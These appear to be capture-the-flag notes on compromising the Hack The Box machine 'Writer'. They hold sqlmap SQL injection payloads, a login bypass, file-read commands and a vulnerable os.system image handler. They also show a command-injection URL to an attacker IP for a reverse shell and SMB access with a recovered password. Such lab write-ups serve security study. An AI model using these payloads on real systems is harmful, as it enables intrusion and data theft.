## Info 
### Credentiak 
 User | Password           | Service | Note
------|--------------------|---------|------
admin |ToughPasswordToCrack|         |
kyle  |                    |         |

### HTTP
- domain: `Writer.HTB`
- login page: `/administrative`
#### Database
- `site` table
```
id | title | description | logo | favicon | ganalytics
```
- `users` table
```
id | username | password | email | status | date_created
```
- `stories` table
```
id | author | title | tagline | content | status | date | image
```


## Path
### User
1. Found `/administrative` has SQL Injection.
```
sqlmap identified the following injection point(s) with a total of 90 HTTP(s) requests:
---
Parameter: uname (POST)
    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: uname=admin' AND (SELECT 3785 FROM (SELECT(SLEEP(5)))wVdK) AND 'vekP'='vekP&password=admin

    Type: UNION query
    Title: Generic UNION query (NULL) - 6 columns
    Payload: uname=admin' UNION ALL SELECT NULL,CONCAT(0x71766a7171,0x647273715a44645a656a444341676c59677353484f4d4c6370686a614b634c4a6356496c44476c5a,0x716b766271),NULL,NULL,NULL,NULL-- -&password=admin
---
[16:14:36] [INFO] the back-end DBMS is MySQL
web server operating system: Linux Ubuntu 20.04 or 19.10 (focal or eoan)
web application technology: Apache 2.4.41
back-end DBMS: MySQL >= 5.0.12 (MariaDB fork)
```
2. Use SQL Injection to login as `admin`.
```
uname=admin'-- -&password=admin
```
3. Found the db schema, the tables, the cloumn names, and useful data.
```
SQL query> select schema_name from information_schema.schemata limit 1,1
writer

SQL query> select table_name from information_schema.tables limit 76,1
site
SQL query> select table_name from information_schema.tables limit 77,1
stories
SQL query> select table_name from information_schema.tables limit 78,1
users
SQL query> select column_name from information_schema.columns where table_name= 'site' limit 0,1
id
SQL query> select column_name from information_schema.columns where table_name= 'site' limit 1,1
title
...
```
4. Use `sqlmap` to read files and found the path `/var/www/writer.htb` at `000-default.conf`. Then find the source code of the website `/var/www/writer.htb/writer/__init__.py`.
```
$ sqlmap -r login.req --file-read '/etc/apache2/sites-available/000-default.conf'
```
5. The source code of the website use `os.system` when handling the uploaded image of the story, we can get shell by abusing this function.
```
# __init.py__
if ".jpg" in image_url:
  try:
    local_filename, headers = urllib.request.urlretrieve(image_url)
    os.system("mv {} {}.jpg".format(local_filename, local_filename))
```
6. The `image_url` parameter in the post can execute file`, we need to manually set it in the burp suite.
```
# Verify request
http://10.10.16.9/ice.jpg
# Get rev shell
http://10.10.16.9/ice.jpg;
7. We can read `writer2_project` share with credential `kyle:ToughPasswordToCrack`.
```
$ mkdir smb-kyle && cd smb-kyle
$ smbget -U kyle -R smb://$ip/writer2_project/writer_web
Password for [kyle] connecting to //writer2_project/10.10.11.101:
Using workgroup WORKGROUP, user kyle
smb://10.10.11.101/writer2_project/writer_web/apps.py
smb://10.10.11.101/writer2_project/writer_web/views.py
...
```
